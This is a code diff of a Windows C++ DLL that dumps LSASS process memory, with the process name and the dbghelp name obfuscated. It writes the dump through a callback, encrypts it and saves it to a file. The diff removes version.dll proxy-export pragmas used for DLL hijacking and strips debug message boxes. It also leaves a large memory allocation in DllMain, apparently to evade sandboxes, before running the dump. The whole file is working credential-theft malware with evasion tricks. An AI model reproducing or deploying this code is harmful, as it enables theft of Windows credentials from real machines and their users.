@@ -4,24 +4,6 @@
 #include <TlHelp32.h>
 #include <DbgHelp.h>
 
-#pragma comment(linker,"/export:GetFileVersionInfoA=C:\\Windows\\System32\\version.GetFileVersionInfoA,@1")
-#pragma comment(linker,"/export:GetFileVersionInfoByHandle=C:\\Windows\\System32\\version.GetFileVersionInfoByHandle,@2")
-#pragma comment(linker,"/export:GetFileVersionInfoExA=C:\\Windows\\System32\\version.GetFileVersionInfoExA,@3")
-#pragma comment(linker,"/export:GetFileVersionInfoExW=C:\\Windows\\System32\\version.GetFileVersionInfoExW,@4")
-#pragma comment(linker,"/export:GetFileVersionInfoSizeA=C:\\Windows\\System32\\version.GetFileVersionInfoSizeA,@5")
-#pragma comment(linker,"/export:GetFileVersionInfoSizeExA=C:\\Windows\\System32\\version.GetFileVersionInfoSizeExA,@6")
-#pragma comment(linker,"/export:GetFileVersionInfoSizeExW=C:\\Windows\\System32\\version.GetFileVersionInfoSizeExW,@7")
-#pragma comment(linker,"/export:GetFileVersionInfoSizeW=C:\\Windows\\System32\\version.GetFileVersionInfoSizeW,@8")
-#pragma comment(linker,"/export:GetFileVersionInfoW=C:\\Windows\\System32\\version.GetFileVersionInfoW,@9")
-#pragma comment(linker,"/export:VerFindFileA=C:\\Windows\\System32\\version.VerFindFileA,@10")
-#pragma comment(linker,"/export:VerFindFileW=C:\\Windows\\System32\\version.VerFindFileW,@11")
-#pragma comment(linker,"/export:VerInstallFileA=C:\\Windows\\System32\\version.VerInstallFileA,@12")
-#pragma comment(linker,"/export:VerInstallFileW=C:\\Windows\\System32\\version.VerInstallFileW,@13")
-#pragma comment(linker,"/export:VerLanguageNameA=C:\\Windows\\System32\\version.VerLanguageNameA,@14")
-#pragma comment(linker,"/export:VerLanguageNameW=C:\\Windows\\System32\\version.VerLanguageNameW,@15")
-#pragma comment(linker,"/export:VerQueryValueA=C:\\Windows\\System32\\version.VerQueryValueA,@16")
-#pragma comment(linker,"/export:VerQueryValueW=C:\\Windows\\System32\\version.VerQueryValueW,@17")
-
 // Global variables the will hold the dump data and its size
 LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 200); // Allocate 200MB buffer on the heap
 DWORD dumpSize = 0;
@@ -166,7 +148,7 @@ int main(int argc, char** argv)
 	CallbackInfo.CallbackRoutine = DumpCallbackRoutine;
 
 	// Do full memory dump of ls__a_ss and use our CallbackRoutine to handle the dump data instead of writing it directly to disk
-	typedef BOOL (WINAPI *MyMiniDumpWriteDump)(HANDLE, DWORD, HANDLE, MINIDUMP_TYPE, PMINIDUMP_EXCEPTION_INFORMATION, PMINIDUMP_USER_STREAM_INFORMATION, PMINIDUMP_CALLBACK_INFORMATION);
+	typedef BOOL(WINAPI* MyMiniDumpWriteDump)(HANDLE, DWORD, HANDLE, MINIDUMP_TYPE, PMINIDUMP_EXCEPTION_INFORMATION, PMINIDUMP_USER_STREAM_INFORMATION, PMINIDUMP_CALLBACK_INFORMATION);
 
 	char dbg$$h$lp[MAX_PATH];
 	memset(dbg$$h$lp, 0, MAX_PATH);
@@ -198,7 +180,6 @@ int main(int argc, char** argv)
 	BOOL success = myMiniDumpWriteDump(hProc, pid, NULL, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo);
 	if (success) {
 		printf("[+] Successfully dumped ls__a_ss to memory!\n");
-		MessageBox(NULL, "OK", "OK", MB_OK);
 	}
 	else {
 		printf("[-] Could not dump ls__a_ss to memory\n[-] Error Code: %i\n", GetLastError());
@@ -219,18 +200,16 @@ int main(int argc, char** argv)
 	printf("[+] Enrypted dump data written to \"sorpresa.txt\" file\n");
 }
 
+extern "C" __declspec(dllexport)
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
-	if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
-		MessageBox(NULL, "Running", "Running", MB_OK);
-		
-		char* mem = NULL;
-		mem = (char*)malloc(6442450944);
-		
-		if (mem != NULL) {
-			memset(mem, 00, 6442450944);
-			free(mem);
-			main(0, {});
-		}
+	char* mem = NULL;
+	mem = (char*)malloc(6442450944);
+
+	if (mem != NULL) {
+		memset(mem, 00, 6442450944);
+		free(mem);
+		main(0, {});
 	}
+
 	return TRUE;
 }
